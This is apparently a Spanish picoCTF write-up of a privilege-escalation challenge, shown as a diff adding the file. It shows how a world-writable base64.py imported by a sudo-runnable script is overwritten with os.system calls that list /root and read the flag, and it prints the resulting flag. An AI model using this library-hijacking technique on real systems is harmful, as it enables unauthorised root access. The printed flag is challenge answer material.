@@ -1,0 +1,70 @@
+Nos conectamos por medio de SSH con los datos que nos dan en el reto.
+
+De primera instancia no vemos nada con "ls", entonces ejecutamos "ls -la" para ver archivos ocultos y vemos un
+archivo interesante .server.py.
+
+Lo siguiente que vamos a hacer es ver que comandos como admin tenemos, con el comando "sudo -l", tenemos la siguiente
+salida:
+
+User picoctf may run the following commands on challenge:
+    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
+
+Eso significa que podemos ejecutar lo siguiente "sudo /usr/bin/python3 /home/picoctf/.server.py" y no se nos
+va a pedir password para credenciales de sudo.
+
+Revisemos el archivo .server.py:
+
+import base64
+import os
+import socket
+ip = 'picoctf.org'
+response = os.system("ping -c 1 " + ip)
+#saving ping details to a variable
+host_info = socket.gethostbyaddr(ip) 
+#getting IP from a domaine
+host_info_to_str = str(host_info[2])
+host_info = base64.b64encode(host_info_to_str.encode('ascii'))
+print("Hello, this is a part of information gathering",'Host: ', host_info) 
+
+No vemos nada inusual, simplemente hace un ping. Revisemos que permisos tenemos. Intentando no tenemos
+permiso para entrar en la carpeta root (quiza ahi esta el flag, casi siempre esta ahi en una escalamiento 
+de privilegio) entonces pensemos como podemos entrar o listar lo que esta ahi. Revisemos los paquetes de python que se
+estan importanto.
+
+Encontramos los paquetes que se estan importando, estan en la carpeta /lib/python3.8, hacemos un "ls -la" y vemos
+lo siguiente:
+
+-rwxrwxrwx 1 root root  20382 May 26  2023 base64.py
+
+Tenemos completo acceso de una libreria que estamos importando en un script que podemos ejecutar como administrador
+Entonces vamos a sobreescribir y hacer lo siguiente:
+
+import os
+os.system("ls -la /root")
+
+Al ejecutar con ese cambio vemos lo siguiente:
+
+sudo /usr/bin/python3 /home/picoctf/.server.py
+total 12
+drwx------ 1 root root   23 Sep 26  2024 .
+drwxr-xr-x 1 root root   51 Sep 10 05:04 ..
+-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
+-rw-r--r-- 1 root root   43 Sep 26  2024 .flag.txt
+-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
+
+Encontramos el flag, entonces agregamos lo siguiente:
+
+os.system("cat /root/.flag.txt")
+
+Ejecutamos con esa nueva linea y tenemos los siguiente:
+
+sudo /usr/bin/python3 /home/picoctf/.server.py
+total 12
+drwx------ 1 root root   23 Sep 26  2024 .
+drwxr-xr-x 1 root root   51 Sep 10 05:04 ..
+-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
+-rw-r--r-- 1 root root   43 Sep 26  2024 .flag.txt
+-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
+picoCTF{pYth0nn_libraryH!j@CK!n9_0083cb0b}
+
+Encontramos el flag
